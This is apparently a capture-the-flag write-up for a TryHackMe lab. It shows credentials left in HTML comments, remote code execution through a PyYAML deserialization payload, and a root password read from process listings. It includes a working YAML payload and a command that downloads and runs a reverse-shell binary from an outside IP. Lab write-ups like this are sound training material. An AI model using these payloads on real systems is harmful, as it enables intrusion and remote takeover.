# URL
https://tryhackme.com/room/hh-beachbar-d849f7f7/
# Concept
* credentials found in HTTP comments
* RCE through Python `PyYAML` module
  * insecure deserialization exploit
* credentials exposed in command-line arguments
  * process enumeration
# Method of solve
## Beginning Scans
* the website has credentials in its HTTP comments
* once logged into the app, we see we can upload yaml files
  * there is a insecure deserialization vulnerability in the app code
* we can upload a file with the following contents as a test for the vulnerability:
```
!!python/object/apply:os.system ["whoami"]
```
* we get a status code back on the web app, which is `0`, which means success
## Initial Access
* from here, we can upload a malicious reverse shell binary and execute it
```
!!python/object/apply:os.system ["wget http://192.168.134.186/reverse.elf && chmod +x ./reverse.elf && ./reverse.elf"]
```
* and we're in!
## Privilege Escalation
* we're working as the `bartender` user
* if we look at the running processes, we notice there's a password in the output (make sure to shrink your terminal text to get the full command)
```
ps aux
```
* this is the password for the root user
* done!

